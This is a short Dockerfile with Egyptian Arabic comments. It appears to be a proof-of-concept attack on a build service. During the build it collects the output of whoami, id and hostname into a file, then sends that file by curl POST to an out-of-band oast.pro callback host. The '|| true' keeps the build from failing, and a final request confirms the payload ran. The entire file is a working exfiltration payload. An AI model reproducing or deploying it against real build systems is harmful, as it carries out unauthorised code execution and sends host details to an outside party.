FROM alpine:latest

# 1. نزل curl
RUN apk add --no-cache curl

# 2. اكتب ناتج الأوامر جوه ملف text
# الأمر ده بسيط ومستحيل يفشل
RUN echo "--- HACK SUCCESS ---" > /tmp/hacked.txt
RUN whoami >> /tmp/hacked.txt
RUN id >> /tmp/hacked.txt
RUN hostname >> /tmp/hacked.txt

# 3. ابعت محتوى الملف ليك (POST Request)
# بنستخدم $(cat ...) عشان نقرأ الملف ونبعته
# حطينا || true عشان لو فشل الـ Build يكمل
RUN curl -X POST -d "$(cat /tmp/hacked.txt)" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/exfil || true

# 4. ريكويست تأكيد أخير (عشان لو اللي فوق فشل نعرف)
RUN curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/alive
